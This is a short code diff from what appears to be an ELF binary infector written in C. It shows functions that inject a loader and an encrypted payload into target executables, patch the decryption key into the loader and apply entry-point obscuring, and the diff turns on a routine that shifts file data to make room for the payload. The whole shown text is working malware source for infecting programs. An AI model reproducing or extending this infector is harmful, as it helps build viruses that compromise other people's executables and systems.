@@ -35,15 +35,6 @@ static void	inject_loader(t_info *info)
 	patch_loader(info);
 }
 
-/*
-static void	nice_with_gdb(t_info *info)
-{
-	size_t size;
-	size = info->file_size - (info->bss_size + PAYLOAD_SIZE);
-	size = size - info->begin_bss;
-
-// 	ft_memcpy(info->file + info->offset_payload + PAYLOAD_SIZE, info->file + info->offset_payload, size);
-}*/
 
 static void	patch_payload(t_info *info)
 {
@@ -157,6 +148,7 @@ uint32_t    encrypt(void *ptr, size_t size)
     file = (uint32_t *)ptr;
     key = KEY;
     int nb = 0;
+	size = (size / 4 ) * 4;
     while (nb < 8)
     {   
         i = 0;
@@ -178,6 +170,16 @@ void			patch_key(t_info *info, uint32_t key)
 	// Key in loader
 	val = key;
 	ft_memcpy(info->text_begin + info->text_size + 0x7C, &val, 4); // 0x7D is pos of instruction targeted in loader
+}
+
+
+static void	nice_with_gdb(t_info *info)
+{
+	size_t size;
+	size = info->file_size - (info->bss_size + PAYLOAD_SIZE);
+	size = size - info->begin_bss;
+
+ 	ft_memcpy_r(info->file + info->offset_payload + PAYLOAD_SIZE, info->file + info->begin_bss, size);
 }
 
 static void		infect_file(char *path)
@@ -204,7 +206,7 @@ static void		infect_file(char *path)
 	if (find_text(&info) == 1)
 		goto end_fct;
 	inject_loader(&info);
-// 	nice_with_gdb(&info);
+	nice_with_gdb(&info);
 	inject_payload(&info);
 	inject_end(&info);
 	epo_parsing(&info);
